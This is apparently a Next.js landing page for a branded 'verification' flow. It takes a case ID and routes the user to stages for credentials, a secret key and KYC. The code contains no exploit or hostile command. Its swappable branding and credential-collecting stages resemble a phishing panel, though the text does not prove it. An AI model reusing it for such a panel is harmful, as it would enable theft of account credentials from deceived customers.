'use client';

/**
 * Landing/Home Page - KCU Minimal Design
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';

export default function HomePage() {
  const router = useRouter();

  const [caseNumber, setCaseNumber] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  /**
   * Handle case ID submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseNumber.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        // Lookup existing session by case ID
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseNumber.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        // Map stage name to route
        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        // Store session UUID and case ID in session store
        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          stage: currentStage as any,
        });

        // Redirect to current stage
        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseNumber, router]
  );

  return (
    <div className="min-h-screen bg-[#fbfbfb] px-5 py-8">
      <div className="max-w-md mx-auto">
        {/* Logo */}
        <div className="text-center mb-12">
          <img
            src={currentBrand.logo}
            alt={currentBrand.companyName}
            className="w-56 h-auto mx-auto"
            onError={(e) => {
              e.currentTarget.style.display = 'none';
            }}
          />
        </div>

        {/* Case Number Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Case ID Input */}
          <div>
            <div className={`border-b ${fieldError ? 'border-red-500' : 'border-gray-300'}`}>
              <label
                htmlFor="caseId"
                className="block text-sm text-[#036647] mb-2"
              >
                Enter your Case ID
              </label>
              <input
                type="text"
                id="caseId"
                name="case_id"
                placeholder="Case ID"
                value={caseNumber}
                onChange={(e) => {
                  setCaseNumber(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isLoading}
                autoComplete="off"
                className="w-full bg-transparent border-none outline-none pb-3 text-base"
                required
              />
            </div>
            {fieldError && (
              <div className="invalid-feedback" style={{ display: 'block' }}>
                {fieldError}
              </div>
            )}
          </div>

          {/* Submit Button */}
          <div className="pt-6">
            <button
              type="submit"
              disabled={!caseNumber || isLoading}
              className={`w-full text-white font-medium text-lg uppercase tracking-wide transition-colors ${caseNumber
                ? 'bg-[#036647] border-[#036647] shadow-[0_2px_2px_0_rgba(0,0,0,0.16)]'
                : 'bg-[#c4c4c4] border-[#c4c4c4]'
                }`}
              style={{
                padding: '0.375rem 0.75rem',
                borderWidth: '1px',
                borderStyle: 'solid',
                borderRadius: '0.25rem',
                fontSize: '1rem',
                fontWeight: 400,
                lineHeight: 1.5
              }}
            >
              {isLoading ? 'Verifying...' : 'Continue'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
